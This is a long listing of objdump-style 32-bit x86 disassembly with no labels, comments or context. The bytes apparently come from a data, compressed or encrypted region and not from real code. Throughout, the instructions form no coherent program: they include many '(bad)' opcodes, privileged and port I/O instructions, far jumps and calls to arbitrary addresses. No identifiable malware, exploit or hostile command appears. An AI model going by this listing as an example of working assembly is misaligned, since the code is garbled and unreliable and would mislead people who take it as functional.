  413fd4:	mov    WORD PTR [edx],fs
  413fd6:	int3   
  413fd7:	in     eax,0x54
  413fd9:	cmp    al,dh
  413fdb:	push   ecx
  413fdc:	enter  0xc5df,0xf6
  413fe0:	sbb    al,0xa3
  413fe2:	cmp    BYTE PTR [edx+0x17],cl
  413fe5:	loop   0x414061
  413fe7:	sub    esp,0x443d54a1
  413fed:	and    eax,0xe50bfbe1
  413ff2:	(bad)  
  413ff3:	retf   0x4b32
  413ff6:	inc    edi
  413ff7:	inc    ebp
  413ff8:	je     0x413fcb
  413ffa:	je     0x414051
  413ffc:	retf   0xcf14
  413fff:	and    DWORD PTR [ebx],esi
  414001:	adc    ah,cl
  414003:	daa    
  414004:	les    esi,FWORD PTR [ebx-0x2da23d3f]
  41400a:	mov    ecx,0xa292c9c
  41400f:	cdq    
  414010:	push   0x4d
  414012:	lock push eax
  414014:	cmp    eax,0x40d7817e
  414019:	adc    dl,BYTE PTR [ecx+0x6e311dce]
  41401f:	mov    bh,0x6f
  414021:	sti    
  414022:	outs   dx,DWORD PTR ds:[esi]
  414023:	cmp    ebx,DWORD PTR [eax]
  414025:	fldenv [edx+eax*1-0x1e72dcd7]
  41402c:	push   esi
  41402d:	jmp    0xa744f44e
  414032:	adc    eax,0x135171b0
  414037:	xor    ecx,ebx
  414039:	jne    0x413fc7
  41403b:	inc    edi
  41403c:	es adc eax,0x5c32690e
  414042:	xchg   ebp,eax
  414043:	mov    dh,0xd7
  414046:	mov    ds:0x7341f8b3,al
  41404b:	mov    al,0x57
  41404d:	outs   dx,BYTE PTR ds:[esi]
  41404e:	add    al,0xb7
  414050:	fwait
  414051:	xchg   edx,eax
  414052:	dec    eax
  414053:	shl    DWORD PTR [edi],0x94
  414056:	adc    bh,BYTE PTR [eax]
  414058:	popf   
  414059:	call   0x8b66d50c
  41405e:	xchg   DWORD PTR [ecx+0x27],ebx
  414061:	shl    al,1
  414063:	outs   dx,DWORD PTR ds:[esi]
  414064:	pop    ecx
  414065:	jae    0x414011
  414067:	dec    BYTE PTR [eax+0x2e]
  41406a:	add    edi,DWORD PTR [ebx+0x6762ad4a]
  414070:	mov    esp,ebp
  414072:	pusha  
  414073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414074:	cmp    al,0xd1
  414076:	push   ebp
  414077:	cli    
  414078:	cmp    al,0xe6
  41407a:	lea    ecx,[esi]
  41407c:	jne    0x41409f
  41407e:	rol    BYTE PTR [edi-0x27c84351],cl
  414084:	(bad)  
  414085:	(bad)  
  414087:	jg     0x4140cf
  414089:	fnstsw WORD PTR [edi-0x63]
  41408c:	jmp    0x951d5aa6
  414091:	sub    esi,DWORD PTR [ebx]
  414093:	dec    esi
  414094:	pop    ss
  414095:	and    ecx,DWORD PTR [ebp-0x7e529afd]
  41409b:	add    BYTE PTR [edx-0x2e],al
  41409e:	addr16 push ecx
  4140a0:	adc    ebx,DWORD PTR gs:[edi]
  4140a3:	push   cs
  4140a4:	fwait
  4140a5:	or     al,0x75
  4140a7:	cdq    
  4140a8:	or     ch,ch
  4140aa:	inc    ebx
  4140ab:	in     al,0x44
  4140ad:	ss aam 0x62
  4140b0:	ss pushf 
  4140b2:	inc    ebx
  4140b3:	popa   
  4140b4:	ins    BYTE PTR es:[edi],dx
  4140b5:	push   ss
  4140b6:	xchg   ebp,eax
  4140b7:	shl    BYTE PTR [eax+eax*1],cl
  4140ba:	mov    ebx,DWORD PTR [ecx-0x17]
  4140bd:	lock in eax,0x62
  4140c0:	xchg   DWORD PTR [ebx],ebx
  4140c2:	mov    esp,0x688e709b
  4140c7:	sbb    cl,bl
  4140c9:	pop    eax
  4140ca:	jno    0x41405e
  4140cc:	pop    esp
  4140cd:	push   ebx
  4140ce:	add    eax,0x652774e0
  4140d3:	shl    BYTE PTR [eax],1
  4140d5:	inc    esi
  4140d6:	sbb    DWORD PTR [ebx-0x37d035cb],eax
  4140dc:	stos   BYTE PTR es:[edi],al
  4140dd:	inc    ecx
  4140de:	and    DWORD PTR [esp+ebp*1+0x4c],ebp
  4140e2:	call   DWORD PTR [esi]
  4140e4:	pusha  
  4140e5:	and    eax,0xc817900a
  4140ea:	or     eax,DWORD PTR ds:0x138e684a
  4140f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140f1:	dec    edi
  4140f2:	push   ss
  4140f3:	mov    cl,0xbc
  4140f5:	xchg   ecx,eax
  4140f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f7:	pushf  
  4140f8:	cwde   
  4140f9:	mov    esp,0x71eedbf5
  4140fe:	sub    dh,BYTE PTR [ebx-0x3f92aa73]
  414104:	popf   
  414105:	jle    0x4140fd
  414107:	aas    
  414108:	mov    ah,0x64
  41410a:	pop    edx
  41410b:	dec    BYTE PTR [edx-0x36a52f04]
  414111:	inc    eax
  414112:	xchg   esp,eax
  414113:	outs   dx,BYTE PTR ds:[esi]
  414114:	jp     0x414133
  414116:	pop    es
  414117:	dec    edi
  414118:	loopne 0x41417e
  41411a:	cmp    DWORD PTR fs:[esi],ebx
  41411d:	or     al,0x33
  41411f:	retf   
  414120:	push   edx
  414121:	mov    ch,0xde
  414123:	add    ebx,edx
  414125:	cmp    al,0x71
  414127:	popf   
  414128:	jns    0x4140d3
  41412a:	addr16 dec eax
  41412c:	sahf   
  41412d:	and    ecx,DWORD PTR [ecx+0x5aa73a84]
  414133:	lds    ecx,FWORD PTR [ebx-0x17]
  414136:	inc    esp
  414137:	or     dh,BYTE PTR [edx-0x5ead94fd]
  41413d:	ja     0x41414e
  41413f:	dec    ebx
  414140:	ins    DWORD PTR es:[edi],dx
  414141:	neg    BYTE PTR [edx-0x5edfa1f1]
  414147:	sub    DWORD PTR [ecx+eax*2],0x9da4689c
  41414e:	imul   ebx,DWORD PTR [edi+edx*2-0x315571a3],0x71a49728
  414159:	fisub  DWORD PTR [edi]
  41415b:	ret    0xc15f
  41415e:	cmp    ecx,edi
  414160:	adc    eax,edx
  414162:	lods   eax,DWORD PTR ds:[esi]
  414163:	sbb    BYTE PTR [ebx-0x5e23ee8a],al
  414169:	ss emms 
  41416c:	into   
  41416d:	int3   
  41416e:	jae    0x41418e
  414170:	mov    ecx,0xa8dd4998
  414175:	or     DWORD PTR [ebp-0x618b8b5],ecx
  41417b:	inc    eax
  41417c:	xchg   edi,eax
  41417d:	xchg   ecx,eax
  41417e:	cmc    
  41417f:	cmp    ch,BYTE PTR [ecx]
  414181:	xchg   ebx,eax
  414182:	or     ch,cl
  414184:	pop    ecx
  414185:	adc    cl,BYTE PTR [esi-0x75]
  414188:	sbb    BYTE PTR [eax-0x1],dl
  41418b:	xchg   esp,edx
  41418d:	or     bh,dh
  41418f:	xchg   edx,ebx
  414191:	pop    eax
  414192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414193:	sub    al,0x3b
  414195:	lahf   
  414196:	xchg   BYTE PTR [edi],bh
  414198:	mov    ch,0xca
  41419a:	lods   al,BYTE PTR ds:[esi]
  41419b:	es in  al,dx
  41419d:	and    BYTE PTR [eax+0x4c],bl
  4141a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a1:	outs   dx,DWORD PTR ds:[esi]
  4141a2:	sahf   
  4141a3:	div    BYTE PTR [esi+ebp*8]
  4141a6:	jge    0x41416d
  4141a8:	sub    DWORD PTR [ebx],0xffffff89
  4141ab:	call   0x624db9a0
  4141b0:	add    BYTE PTR [edx-0x52],0xd
  4141b4:	std    
  4141b5:	mov    bh,0xbc
  4141b7:	outs   dx,DWORD PTR ds:[esi]
  4141b8:	sbb    al,0x70
  4141ba:	gs ret 
  4141bc:	pop    esi
  4141bd:	(bad)  [edx+0x5f8aa352]
  4141c3:	or     bl,cl
  4141c5:	cdq    
  4141c6:	jns    0x4141b4
  4141c8:	jge    0x414245
  4141ca:	ror    DWORD PTR [eax],1
  4141cc:	pop    ebp
  4141cd:	fs pop edx
  4141cf:	add    DWORD PTR [ecx+0x1b430839],edi
  4141d5:	adc    ebp,edx
  4141d7:	out    0x5c,eax
  4141d9:	xchg   BYTE PTR [ecx+0x5e],dh
  4141dc:	repnz dec edi
  4141de:	push   edx
  4141df:	test   DWORD PTR [eax-0x7b],0x2e4ee63
  4141e6:	and    edx,DWORD PTR [ebx-0x2e2bc1d2]
  4141ec:	cdq    
  4141ed:	and    DWORD PTR [ecx+0x1c07cfe6],edi
  4141f3:	sub    edi,DWORD PTR [edx+0x4564e44a]
  4141f9:	push   ecx
  4141fa:	bound  ebx,QWORD PTR [ecx+ebx*2]
  4141fd:	mov    ds:0x65a6576f,al
  414202:	jmp    0x3125:0x7430377
  414209:	lahf   
  41420a:	xor    al,0x16
  41420c:	mov    eax,0x57a6e9d8
  414211:	or     eax,0xb4863458
  414216:	imul   esi,eax,0xd6a2e157
  41421c:	in     al,dx
  41421d:	fisubr DWORD PTR [ebp-0x754c66f9]
  414223:	stos   DWORD PTR es:[edi],eax
  414224:	fisub  WORD PTR [edi]
  414226:	push   esp
  414227:	add    DWORD PTR [edi-0x36435bf9],ecx
  41422d:	lahf   
  41422e:	ja     0x41425d
  414230:	push   esp
  414231:	ja     0x4141cd
  414233:	or     DWORD PTR [ecx],0xffffffd8
  414236:	cli    
  414237:	jae    0x4141e4
  414239:	xchg   DWORD PTR [ebp-0x4],esp
  41423c:	xor    DWORD PTR [eax],esi
  41423e:	adc    al,0x94
  414240:	sub    ebp,esi
  414242:	test   eax,0xe7433012
  414247:	outs   dx,DWORD PTR ds:[esi]
  414248:	xor    DWORD PTR [edx-0x3b],0xc48ed3f
  41424f:	or     BYTE PTR [esp+edi*8],ah
  414252:	push   0xffffffdd
  414254:	mov    ds:0x2e61d4ad,eax
  414259:	retf   0x3de9
  41425c:	push   edi
  41425d:	push   edi
  41425e:	mov    ebp,0x6315ded8
  414263:	pop    esp
  414264:	cmp    ebp,edx
  414266:	daa    
  414267:	jnp    0x4142b5
  414269:	and    bh,bl
  41426b:	mov    ch,0xb1
  41426d:	or     BYTE PTR ds:0xdc39d2d0,al
  414273:	jne    0x41429c
  414275:	mov    eax,ds:0x42d6b12a
  41427a:	pop    edx
  41427b:	popf   
  41427c:	cmp    DWORD PTR [edi+0x2aa34199],ecx
  414282:	(bad)  
  414283:	js     0x41420c
  414285:	in     eax,0x7c
  414287:	sub    cl,BYTE PTR [esi+0x2b1e93d7]
  41428d:	cmp    al,0x2c
  41428f:	cwde   
  414290:	es jge 0x414262
  414293:	out    dx,al
  414294:	add    edx,edi
  414296:	test   BYTE PTR [edi-0x54607226],cl
  41429c:	sbb    DWORD PTR [edx+0x7ed82fe9],ebx
  4142a2:	cmp    ebx,DWORD PTR [ebx-0x2e]
  4142a5:	sub    BYTE PTR [ebx+0x55cdf31e],0xee
  4142ac:	push   ds
  4142ad:	and    BYTE PTR [edx-0x40620f91],al
  4142b3:	retf   
  4142b4:	cmp    eax,DWORD PTR [esi+0x7ea4067a]
  4142ba:	fsub   DWORD PTR [edi-0xd]
  4142bd:	test   eax,0x6cd986e5
  4142c2:	fs popa 
  4142c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142c5:	jmp    0x414248
  4142c7:	in     eax,0x80
  4142c9:	sub    al,0xb9
  4142cb:	pop    eax
  4142cc:	lahf   
  4142cd:	(bad)  
  4142cf:	adc    DWORD PTR ds:0xab49ddfb,0x26
  4142d6:	or     DWORD PTR [ebx+0x47],esp
  4142d9:	or     al,0x42
  4142db:	aaa    
  4142dc:	pushf  
  4142dd:	leave  
  4142de:	and    eax,0x49219335
  4142e3:	push   0xffffffa4
  4142e5:	arpl   si,dx
  4142e7:	in     al,0x50
  4142e9:	ins    DWORD PTR es:[edi],dx
  4142ea:	xchg   ecx,eax
  4142eb:	mov    DWORD PTR [edi+0x63],eax
  4142ee:	adc    eax,0x313d5242
  4142f3:	push   edx
  4142f4:	ds pop edx
  4142f6:	out    0xf7,al
  4142f8:	add    cl,bh
  4142fa:	or     bl,BYTE PTR [ebp-0xc398b4b]
  414300:	or     al,0x32
  414302:	sbb    DWORD PTR [eax-0x4d2cd9e2],esp
  414308:	inc    ebx
  414309:	pop    edx
  41430a:	or     al,0x84
  41430c:	out    0x2e,al
  41430e:	adc    dl,BYTE PTR [edi]
  414310:	icebp  
  414311:	daa    
  414312:	sub    BYTE PTR ds:0xa37d032d,0x7b
  414319:	push   ds
  41431a:	(bad)  
  41431b:	pop    esi
  41431c:	push   eax
  41431d:	loop   0x414383
  41431f:	or     al,0xf6
  414321:	jbe    0x414395
  414323:	dec    esp
  414324:	jp     0x41439b
  414326:	add    BYTE PTR [eax],dl
  414328:	hlt    
  414329:	test   BYTE PTR [ecx],bl
  41432b:	popf   
  41432c:	or     DWORD PTR [bp-0x24],ebx
  414330:	shl    BYTE PTR [ebx],cl
  414332:	enter  0x4583,0xa1
  414336:	aaa    
  414337:	jns    0x4142c6
  414339:	call   0x57f1:0xea87b0d1
  414340:	ret    
  414341:	inc    ecx
  414342:	nop
  414343:	call   0x7baa23b1
  414348:	cdq    
  414349:	aad    0x11
  41434b:	xor    al,0xe1
  41434e:	mov    edx,0x6f21f21f
  414353:	mov    ch,0xb5
  414355:	add    dh,BYTE PTR [ebx]
  414357:	nop
  414358:	pushf  
  414359:	es fs (bad) 
  41435c:	js     0x4143ae
  41435e:	xchg   edx,eax
  41435f:	lea    eax,[ebx-0x23d8db48]
  414365:	cwde   
  414366:	jo     0x4142ec
  414368:	jle    0x4142ec
  41436a:	loopne 0x414370
  41436c:	adc    al,0x1
  41436e:	retf   
  41436f:	push   es
  414370:	or     ecx,DWORD PTR [ecx-0x7aa6acd8]
  414376:	jmp    0x6bd8:0x80f893ec
  41437d:	popa   
  41437e:	int3   
  41437f:	or     eax,0xb42c9d52
  414384:	aad    0x9e
  414386:	(bad)  
  414387:	push   esi
  414388:	daa    
  414389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41438a:	and    DWORD PTR [esi],0x9
  41438d:	jmp    0x414352
  41438f:	icebp  
  414390:	test   al,0x42
  414392:	pop    es
  414393:	fisttp WORD PTR [edx+0x15]
  414396:	lahf   
  414397:	shr    DWORD PTR [edi],0x97
  41439a:	mov    ss,WORD PTR [ecx+0x59abdbc4]
  4143a0:	mov    edx,0x31db694e
  4143a5:	out    0xd3,eax
  4143a7:	or     DWORD PTR [ebp-0x2068c179],0x66a8a994
  4143b1:	cmp    DWORD PTR [edi+0x3],eax
  4143b4:	loop   0x414424
  4143b6:	sub    BYTE PTR [eax+0x4f1ad41e],dh
  4143bc:	enter  0xe1e7,0xea
  4143c0:	sub    BYTE PTR [esi-0x3e],ch
  4143c3:	or     al,0xdd
  4143c5:	lods   al,BYTE PTR ds:[esi]
  4143c6:	dec    edx
  4143c7:	xchg   esi,eax
  4143c8:	and    cl,al
  4143ca:	xor    BYTE PTR [edx-0x72],ch
  4143cd:	fsin   
  4143cf:	icebp  
  4143d0:	cmp    ch,cl
  4143d2:	imul   ebx,DWORD PTR [edi+0x6e],0xd943efbd
  4143d9:	(bad)  
  4143da:	mov    al,ds:0xa21851e5
  4143df:	push   es
  4143e0:	mov    esp,0xe16682b1
  4143e5:	sbb    DWORD PTR [edx],esi
  4143e7:	mov    al,ds:0x913e9c73
  4143ec:	clts   
  4143ee:	nop
  4143ef:	dec    esp
  4143f0:	and    eax,0x76282f03
  4143f5:	inc    esi
  4143f6:	shl    BYTE PTR ds:0x7b698457,cl
  4143fc:	jge    0x41446e
  4143fe:	dec    ecx
  4143ff:	loopne 0x414434
  414401:	sbb    dh,bh
  414403:	(bad)  
  414404:	push   esp
  414405:	pop    ebp
  414406:	pushf  
  414407:	xchg   DWORD PTR [ecx-0x33431722],ecx
  41440d:	hlt    
  41440e:	dec    edi
  41440f:	xor    eax,DWORD PTR [edi+eiz*2]
  414412:	xchg   edi,eax
  414413:	int3   
  414414:	sti    
  414415:	ins    DWORD PTR es:[edi],dx
  414416:	ror    DWORD PTR [ecx-0x68],cl
  414419:	xor    edx,ebx
  41441b:	mov    cl,0xbb
  41441d:	scas   eax,DWORD PTR es:[edi]
  41441e:	sbb    eax,0x6d627b1
  414423:	cmp    eax,0x31307153
  414428:	(bad)  
  414429:	pop    esp
  41442a:	cmp    bl,bl
  41442c:	pop    ecx
  41442d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41442e:	stos   BYTE PTR es:[edi],al
  41442f:	gs in  eax,dx
  414431:	jge    0x414422
  414433:	mov    esp,fs
  414435:	cmp    BYTE PTR [eax-0x43],al
  414438:	mov    eax,0xd71773dc
  41443d:	inc    ebp
  41443e:	inc    edi
  41443f:	shr    BYTE PTR [ecx],0xf9
  414442:	out    0xb3,eax
  414444:	xor    edi,edi
  414446:	push   0x6a1723da
  41444b:	clc    
  41444c:	push   ss
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	push   0x3c400e0f
  414453:	leave  
  414454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414455:	lock push eax
  414457:	lahf   
  414458:	sub    edi,ebx
  41445a:	dec    ecx
  41445b:	cmp    bl,dl
  41445d:	stos   DWORD PTR es:[edi],eax
  41445e:	xchg   edi,eax
  41445f:	mov    ebp,0x667aa47f
  414464:	and    esp,DWORD PTR [esi]
  414466:	mov    bh,0x44
  414468:	jnp    0x414431
  41446a:	dec    esp
  41446b:	mov    dh,0xe3
  41446d:	inc    edx
  41446e:	dec    esi
  41446f:	inc    edx
  414470:	in     al,dx
  414471:	add    DWORD PTR [esi],ecx
  414473:	mov    al,0x91
  414475:	in     al,dx
  414476:	and    bl,BYTE PTR [edx-0x1c]
  414479:	inc    edx
  41447a:	sar    esp,cl
  41447c:	enter  0x9a5a,0x1d
  414480:	sbb    ecx,DWORD PTR [edx-0x26]
  414483:	push   ebx
  414484:	ds es (bad) 
  414487:	jae    0x41440a
  414489:	mov    DWORD PTR [ebx-0x118dc7c6],eax
  41448f:	aam    0x47
  414491:	mov    al,cs:0x6e8d323e
  414497:	and    eax,0xbdf2554a
  41449c:	mov    DWORD PTR [edx],esi
  41449e:	mov    al,0x58
  4144a0:	les    ebp,FWORD PTR [esi+0x41]
  4144a3:	jne    0x4144f4
  4144a5:	fiadd  WORD PTR [ecx]
  4144a7:	dec    eax
  4144a8:	cli    
  4144a9:	jnp    0x414524
  4144ab:	add    cl,cl
  4144ad:	int    0x1e
  4144af:	pop    ss
  4144b0:	test   al,0x6b
  4144b2:	xchg   edx,eax
  4144b3:	call   0xe110718d
  4144b8:	nop
  4144b9:	(bad)  
  4144ba:	(bad)  [edx+0x15]
  4144bd:	mov    edi,0xad8a46ff
  4144c2:	aam    0xb9
  4144c4:	mov    edx,0x14849b8c
  4144c9:	icebp  
  4144ca:	jo     0x4144a7
  4144cc:	rcr    BYTE PTR [eax-0x241e64a2],cl
  4144d2:	pop    ds
  4144d3:	jecxz  0x4144b7
  4144d5:	adc    BYTE PTR [edi],ch
  4144d7:	pop    DWORD PTR [edx-0x252c5382]
  4144dd:	cmp    al,bh
  4144df:	add    ah,bl
  4144e1:	mov    ds:0x1061d50c,al
  4144e6:	mov    bl,0xef
  4144e8:	push   esp
  4144e9:	add    DWORD PTR ds:0x1516ae72,esi
  4144ef:	div    DWORD PTR [edx-0x123de334]
  4144f5:	loopne 0x414492
  4144f7:	add    BYTE PTR ss:[edx],dl
  4144fa:	lds    ebx,FWORD PTR [ebx+esi*8+0x7c5c64fa]
  414501:	mov    ah,0x25
  414503:	ss inc ecx
  414505:	cmp    al,0xf3
  414507:	jmp    FWORD PTR [ecx]
  414509:	loope  0x414585
  41450b:	add    ah,bh
  41450d:	lds    esp,FWORD PTR [ebp+0x28]
  414510:	adc    BYTE PTR [edx],ah
  414512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414513:	addr16 push eax
  414515:	imul   esi,DWORD PTR [eax+ecx*2-0x6d03a4ba],0xa70281b6
  414520:	mov    ebp,0x28dbec42
  414525:	mov    ebp,0x37ab425b
  41452a:	imul   eax,edx,0x45
  41452d:	push   esp
  41452e:	fisttp QWORD PTR [ecx+eax*1]
  414531:	inc    ecx
  414532:	dec    dh
  414534:	xor    BYTE PTR [esi+0x4b],ah
  414537:	(bad)  
  414538:	into   
  414539:	mov    edx,0x3e2a7e6b
  41453e:	mul    DWORD PTR [edi-0x31265bdf]
  414544:	push   esp
  414545:	inc    edx
  414546:	or     al,0xd5
  414548:	dec    BYTE PTR [ecx]
  41454a:	test   eax,0xee4bc5cf
  41454f:	leave  
  414550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414551:	jecxz  0x414548
  414553:	or     al,0x69
  414555:	les    esi,FWORD PTR [eax+0x4859ae57]
  41455b:	imul   edi,DWORD PTR [ebp-0x3],0x6c
  41455f:	inc    edi
  414560:	popf   
  414561:	test   DWORD PTR [eax+0x56],ebx
  414564:	cwde   
  414565:	lds    ebp,FWORD PTR [ebx-0x273f7757]
  41456b:	fsub   DWORD PTR [ebp-0x21]
  41456e:	xchg   esi,eax
  41456f:	pop    es
  414570:	cmp    eax,0x578d5472
  414575:	mov    BYTE PTR [ecx+ecx*4],cl
  414578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414579:	pop    edx
  41457a:	mov    ds:0xb8c53b58,al
  41457f:	fcomp  QWORD PTR [ecx+0x48]
  414582:	mov    eax,ds:0xe434f34d
  414587:	bound  ebp,QWORD PTR [edx-0x397708b1]
  41458d:	stos   BYTE PTR es:[edi],al
  41458e:	push   ds
  41458f:	push   ebx
  414590:	or     al,BYTE PTR [ebx+0x3b]
  414593:	ret    0xb52b
  414596:	shr    DWORD PTR [esi-0x38],0x99
  41459a:	fld    TBYTE PTR [ecx-0x6f736f2]
  4145a0:	jnp    0x414536
  4145a2:	jge    0x4145ee
  4145a4:	xor    BYTE PTR [eax+0x13],bh
  4145a7:	int3   
  4145a8:	adc    dh,BYTE PTR [ebx]
  4145aa:	adc    dh,BYTE PTR [ebx]
  4145ac:	and    al,0x38
  4145ae:	cli    
  4145af:	hlt    
  4145b0:	(bad)  
  4145b1:	cmc    
  4145b2:	sbb    eax,0xb265931e
  4145b7:	push   0xffffffa7
  4145b9:	or     BYTE PTR [edx],al
  4145bb:	pop    esp
  4145bc:	sub    eax,0xbf26116b
  4145c1:	mov    WORD PTR [eax],?
  4145c3:	xchg   edi,ebx
  4145c5:	adc    eax,0x3f800626
  4145ca:	scas   al,BYTE PTR es:[edi]
  4145cb:	retf   
  4145cc:	call   0x7ffc:0x4c669084
  4145d3:	in     eax,0x8
  4145d5:	fs pop eax
  4145d7:	add    cl,BYTE PTR [ecx-0x66]
  4145da:	pop    ebp
  4145db:	cmp    al,cl
  4145dd:	mov    ch,0x84
  4145df:	mov    esi,0x1ee939aa
  4145e4:	add    BYTE PTR [ebp+0x66],cl
  4145e7:	inc    edx
  4145e8:	sub    cl,al
  4145ea:	xchg   BYTE PTR [ecx+eiz*1],al
  4145ed:	xchg   ebx,eax
  4145ee:	inc    ecx
  4145ef:	cld    
  4145f0:	fadd   st,st(0)
  4145f2:	ds jne 0x41461a
  4145f5:	push   eax
  4145f6:	scas   al,BYTE PTR es:[edi]
  4145f7:	dec    esp
  4145f8:	dec    ebp
  4145f9:	fnsave [edi-0x41]
  4145fc:	das    
  4145fd:	mov    al,ds:0xe6e5776b
  414602:	cs in  eax,0xe2
  414605:	shr    BYTE PTR [edi-0x22],0x70
  414609:	iret   
  41460a:	enter  0xb01a,0x45
  41460e:	(bad)  
  414610:	mul    DWORD PTR [ecx]
  414612:	mov    esi,DWORD PTR [ecx-0xc5bbd5c]
  414618:	xchg   BYTE PTR [esi-0x30d6e364],al
  41461e:	lea    ebx,[ebx-0x7da33d5c]
  414624:	sbb    DWORD PTR [ebp-0x251cbb9e],edi
  41462a:	add    ch,BYTE PTR [edx-0x48]
  41462d:	outs   dx,BYTE PTR ds:[esi]
  41462e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41462f:	ror    BYTE PTR [ecx-0x3c1341bd],1
  414635:	dec    esi
  414636:	jno    0x414647
  414638:	scas   al,BYTE PTR es:[edi]
  414639:	inc    ebx
  41463a:	xchg   DWORD PTR [ebx+eiz*1+0x70da07c1],ebp
  414641:	jno    0x414691
  414643:	cmp    al,0xc4
  414645:	popa   
  414646:	fucom  st(1)
  414648:	add    dh,BYTE PTR ds:0x427791da
  41464e:	push   ebp
  41464f:	or     esi,DWORD PTR [edx+ecx*1+0xa]
  414653:	int    0x3a
  414655:	imul   esp,DWORD PTR [eax-0x61],0x71
  414659:	and    eax,DWORD PTR [eax+0x527bf370]
  41465f:	ret    0xef8c
  414662:	sub    edx,ebp
  414664:	retf   
  414665:	mov    dl,0xfd
  414667:	data16 xor al,0x37
  41466a:	popa   
  41466b:	loopne 0x41463e
  41466d:	(bad)  
  41466e:	clc    
  41466f:	xor    DWORD PTR [edi],esp
  414671:	loope  0x414692
  414673:	mov    edx,0x92da4d08
  414678:	push   edi
  414679:	hlt    
  41467a:	mov    edx,0x627a20ca
  41467f:	add    DWORD PTR [edi],0x3e819a79
  414685:	stos   DWORD PTR es:[edi],eax
  414686:	stc    
  414687:	loopne 0x414704
  414689:	scas   al,BYTE PTR es:[edi]
  41468a:	push   ss
  41468b:	repz fistp WORD PTR [edi]
  41468e:	pushf  
  41468f:	mov    esi,0xc121ce57
  414694:	or     eax,0x1292f294
  414699:	lea    esp,[edi-0x71225a29]
  41469f:	fwait
  4146a0:	push   edx
  4146a1:	cmp    dl,BYTE PTR [edi-0x45]
  4146a4:	repnz lock jmp 0xc468:0xafb4e1ba
  4146ad:	dec    ebx
  4146ae:	in     al,0x99
  4146b0:	dec    edx
  4146b1:	dec    eax
  4146b2:	popa   
  4146b3:	fs cmp al,0x5a
  4146b6:	jnp    0x41471c
  4146b8:	iret   
  4146b9:	sbb    ecx,DWORD PTR [ebp+0x21]
  4146bc:	pop    ds
  4146bd:	and    BYTE PTR [eax-0x41],dl
  4146c0:	mov    eax,ds:0x382ee65d
  4146c5:	jmp    0x9a579789
  4146ca:	mov    edx,0xfa4ca4b2
  4146cf:	jnp    0x414688
  4146d1:	sub    al,0xee
  4146d3:	test   eax,0x4563a2b1
  4146d8:	cdq    
  4146d9:	jb     0x4146f8
  4146db:	push   eax
  4146dc:	xlat   BYTE PTR ds:[ebx]
  4146dd:	xchg   ebp,eax
  4146de:	loop   0x414705
  4146e0:	arpl   WORD PTR [edx+eiz*1+0x44f0e2fa],cx
  4146e7:	cdq    
  4146e8:	inc    esi
  4146e9:	xchg   esi,eax
  4146ea:	jl     0x41470b
  4146ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ed:	push   0x39
  4146ef:	les    ebx,FWORD PTR [ebp+eax*1+0x6d50f33f]
  4146f6:	sub    DWORD PTR [ecx+eax*1],0x762933b4
  4146fd:	xchg   esi,eax
  4146fe:	fs jecxz 0x4146f1
  414701:	int3   
  414702:	adc    eax,0x5498b097
  414707:	add    al,0xcb
  414709:	popf   
  41470a:	cld    
  41470b:	outs   dx,BYTE PTR ds:[esi]
  41470c:	loop   0x414761
  41470e:	xor    DWORD PTR [esi+0x38c9c91b],ecx
  414714:	cmp    DWORD PTR [edx+0x78],0x3c84a9f3
  41471b:	out    0xf8,eax
  41471d:	and    BYTE PTR [esi-0x11],ah
  414720:	(bad)  
  414721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414722:	ins    BYTE PTR es:[edi],dx
  414723:	mov    esi,0x98ddccc1
  414728:	mov    esp,0xffd3f964
  41472d:	push   0xc1e97396
  414732:	mov    fs,WORD PTR [ecx-0x6f]
  414735:	cmp    edx,DWORD PTR ds:0x2b577b93
  41473b:	enter  0xd158,0x2f
  41473f:	mov    dl,0xd1
  414741:	push   cs
  414742:	dec    edx
  414743:	sbb    dl,bh
  414745:	fwait
  414746:	dec    ecx
  414747:	adc    DWORD PTR [edx],esi
  414749:	sbb    cl,bh
  41474b:	dec    ecx
  41474c:	aam    0x56
  41474e:	fs push 0x44
  414751:	push   ss
  414752:	sub    al,BYTE PTR [edx+eax*1+0x6ec8e773]
  414759:	mov    WORD PTR [ecx],?
  41475b:	jbe    0x4146f5
  41475d:	das    
  41475e:	(bad)  
  41475f:	push   edi
  414760:	(bad)  
  414761:	push   edx
  414762:	or     al,0x2d
  414764:	sbb    eax,0xd6c40d2a
  414769:	ret    0x2ae6
  41476c:	inc    ebx
  41476d:	jmp    0x414735
  41476f:	ret    
  414770:	call   edx
  414772:	fs icebp 
  414774:	xor    al,BYTE PTR [eax-0x54528eee]
  41477a:	ficomp WORD PTR [ebp+0x5a]
  41477d:	pop    ebx
  41477e:	jmp    0x41478c
  414780:	and    eax,0xbf465b58
  414785:	std    
  414786:	lods   eax,DWORD PTR ds:[esi]
  414787:	(bad)  
  414788:	jne    0x414734
  41478a:	int3   
  41478b:	loopne 0x414732
  41478d:	repz mov ?,WORD PTR [ebp+0x52]
  414791:	sbb    eax,0x816d29d9
  414796:	sbb    DWORD PTR [edx-0x5],esp
  414799:	inc    ebp
  41479a:	rol    ebx,0xc1
  41479d:	sti    
  41479e:	xor    ebx,DWORD PTR [ebp-0x9]
  4147a1:	dec    esp
  4147a2:	leave  
  4147a3:	inc    ebx
  4147a4:	add    esp,DWORD PTR [eax]
  4147a6:	cli    
  4147a7:	push   edx
  4147a8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4147aa:	mov    eax,0xeb0602a4
  4147af:	mov    DWORD PTR [esp+edx*1+0x3407fb42],eax
  4147b6:	cld    
  4147b7:	sbb    DWORD PTR [esi-0x3],ebx
  4147ba:	push   ss
  4147bb:	mov    ds:0x6a3082d4,al
